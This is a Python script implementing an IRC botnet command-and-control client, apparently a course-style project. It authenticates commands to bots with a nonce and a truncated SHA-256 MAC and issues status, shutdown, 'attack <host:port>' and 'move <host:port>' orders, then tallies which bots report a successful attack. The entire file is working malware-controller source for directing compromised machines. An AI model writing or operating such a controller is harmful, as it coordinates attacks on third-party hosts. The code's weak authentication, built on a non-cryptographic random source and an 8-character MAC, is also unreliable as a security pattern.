#!/usr/bin/env python3

import sys
import socket
import time
import hashlib
import random
import select
from typing import List, Dict, Tuple, Set, Optional, Any, Union

RESPONSE_TIMEOUT = 5

def computeMac(nonce: str, secret: str) -> str:
    combo = nonce + secret
    sha_val = hashlib.sha256(combo.encode('utf-8')).hexdigest()
    return sha_val[:8]

def nonceGen() -> str:
    return str(random.randint(100000, 999999))

class IRCController:
    """
    Class for controlling IRCbots
    """
    def __init__(self, host: str, port: int, channel: str, secret: str):
        self.host: str = host
        self.port: int = port
        self.channel: str = channel
        self.secret: str = secret
        self.nick: str = f"ctrl_{random.randint(1000, 9999)}"
        self.socket: Optional[socket.socket] = None
        self.connected: bool = False
        self.responses: List[str] = []
        self.recv_buffer: str = ""
    
    def connect(self) -> bool:
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            
            self.send(f"NICK {self.nick}")
            self.send(f"USER {self.nick} 0 * :Bot Controller")
            
            waiting_for_welcome = True
            while waiting_for_welcome:
                data = self.socket.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    return False
                
                lines = data.split('\n')
                for line in lines:
                    line = line.strip()
                    if not line:
                        continue
                    #IRC PING PONG
                    if line.startswith("PING"):
                        pong = line.replace("PING", "PONG", 1)
                        self.send(pong)
                    
                    if " 001 " in line:
                        self.send(f"JOIN #{self.channel}")
                        self.connected = True
                        waiting_for_welcome = False
                        break
            
            print(f"Connected to {self.host}:{self.port} and joined #{self.channel}.")
            return True
            
        except Exception as e:
            print(f"Failed to connect: {e}")
            if self.socket:
                self.socket.close()
                self.socket = None
            self.connected = False
            return False
    
    def send(self, message: str) -> None:
        if self.socket:
            self.socket.sendall(f"{message}\r\n".encode('utf-8'))
    
    def sendMsg(self, message: str) -> None:
        self.send(f"PRIVMSG #{self.channel} :{message}")
    
    def get_response(self, timeout: float = RESPONSE_TIMEOUT) -> bool:
        self.responses = []
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if not self.socket:
                return False
            # Use select to wait for the socket to be ready for reading
            rlist, _, _ = select.select([self.socket], [], [], 0.1)
            if not rlist:
                continue
            
            try:
                data = self.socket.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    print("Disconnected from server.")
                    self.connected = False
                    return False
                
                self.recv_buffer += data
                lines = self.recv_buffer.split('\n')
                # Save any incomplete line back to the buffer
                self.recv_buffer = lines.pop() if lines else ""
                
                for line in lines:
                    line = line.strip()
                    if not line:
                        continue
                    
                    if line.startswith("PING"):
                        pong = line.replace("PING", "PONG", 1)
                        self.send(pong)
                        continue
                    # Process messages containing PRIVMSG and the channel name
                    if "PRIVMSG" in line and f"#{self.channel}" in line:
                        try:
                            sender = line.split('!')[0][1:] if '!' in line else "unknown"
                            message_start = line.find(" :", line.find("PRIVMSG")) + 2
                            
                            if message_start != -1:
                                message = line[message_start:]
                                if message.startswith('-'):
                                    self.responses.append(message)
                        except IndexError:
                            pass
            except Exception as e:
                print(f"Error receiving data: {e}")
                self.connected = False
                return False
        
        return True
    
    def run(self) -> None:
        """
        Method to start the controller, runs indefinitely
        """
        if not self.connect():
            print("Could not connect to the IRC server. Exiting.")
            return
        
        while self.connected:
            try:
                print("cmd> ", end='', flush=True)
                cmd = input().strip()
                
                if not cmd:
                    continue
                
                tokens = cmd.split()
                command = tokens[0].lower()
                #control logic
                if command == "quit":
                    print("Disconnected.")
                    if self.socket:
                        self.socket.close()
                    break
                
                elif command in ["status", "shutdown", "attack", "move"]:
                    #auth
                    nonce = nonceGen()
                    mac = computeMac(nonce, self.secret)
                    
                    if command in ["attack", "move"]:
                        if len(tokens) < 2:
                            print(f"Error: {command} requires <hostname>:<port>")
                            continue
                        
                        target = tokens[1]
                        message = f"{nonce} {mac} {command} {target}"
                    else:
                        message = f"{nonce} {mac} {command}"
                    
                    self.sendMsg(message)
                    
                    print("  Waiting 5s to gather replies.")
                    if not self.get_response(RESPONSE_TIMEOUT):
                        print("  Disconnected while waiting for responses.")
                        break
                    
                    if command == "status":
                        self._handle_status_responses()
                    elif command == "shutdown":
                        self._handle_shutdown_responses()
                    elif command == "attack":
                        self._handle_attack_responses()
                    elif command == "move":
                        self._handle_move_responses()
                
                else:
                    print("Unknown command. Valid commands: status, shutdown, attack <h:p>, move <h:p>, quit.")
            
            except KeyboardInterrupt:
                print("\nKeyboard interrupt. Exiting.")
                if self.socket:
                    self.socket.close()
                break
            
            except Exception as e:
                print(f"Error: {e}")
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    self.socket = None
                break
    
    def _handle_status_responses(self) -> None:
        # list to store tuples of bot nicknames and their counts
        status_bots: List[Tuple[str, str]] = []
        
        for response in self.responses:
            if response.startswith("-status "):
                tokens = response.split()
                if len(tokens) == 3: # "-status", nick, and count
                    nick = tokens[1]
                    count = tokens[2]
                    status_bots.append((nick, count))
        
        print(f"  Result: {len(status_bots)} bots replied.")
        # Create a list of formatted strings for each bot
        if status_bots:
            bot_list = [f"{nick} ({count})" for nick, count in status_bots]
            print(f"    {', '.join(bot_list)}")
    
    def _handle_shutdown_responses(self) -> None:
        shutdown_bots: List[str] = []
        
        for response in self.responses:
            if response.startswith("-shutdown "):
                tokens = response.split()
                if len(tokens) == 2:
                    nick = tokens[1]
                    shutdown_bots.append(nick)
        
        print(f"  Result: {len(shutdown_bots)} bots shut down.")
        if shutdown_bots:
            print(f"    {', '.join(shutdown_bots)}")
    
    def _handle_attack_responses(self) -> None:
        successful: Dict[str, bool] = {}
        failed: Dict[str, str] = {}
        
        for response in self.responses:
            if response.startswith("-attack "):
                tokens = response.split(None, 3)
                if len(tokens) >= 3:
                    nick = tokens[1]
                    result = tokens[2]
                    
                    if result == "OK":
                        successful[nick] = True
                    elif result == "FAIL" and len(tokens) == 4:
                        failed[nick] = tokens[3]
                    else:
                        failed[nick] = "unknown error"
        
        print(f"  Result: {len(successful)} bots attacked successfully:")
        if successful:
            print(f"    {', '.join(successful.keys())}")
        
        print(f"  {len(failed)} bots failed to attack:")
        if failed:
            for nick, reason in failed.items():
                print(f"    {nick}: {reason}")
    
    def _handle_move_responses(self) -> None:
        moved_bots: List[str] = []
        
        for response in self.responses:
            if response.startswith("-move "):
                tokens = response.split()
                if len(tokens) == 2:
                    nick = tokens[1]
                    moved_bots.append(nick)
        
        print(f"  Result: {len(moved_bots)} bots moved.")
        if moved_bots:
            print(f"    {', '.join(moved_bots)}")

def main() -> None:
    if len(sys.argv) != 4:
        print("Usage: ./irccontroller.py <hostname>:<port> <channel> <secret>")
        sys.exit(1)
    
    hostport = sys.argv[1].split(":")
    if len(hostport) != 2:
        print("Error: invalid <hostname>:<port> format")
        sys.exit(1)
    
    host = hostport[0]
    try:
        port = int(hostport[1])
    except ValueError:
        print("Error: port must be a number")
        sys.exit(1)
    
    channel = sys.argv[2]
    secret = sys.argv[3]
    
    controller = IRCController(host, port, channel, secret)
    controller.run()

if __name__ == "__main__":
    main()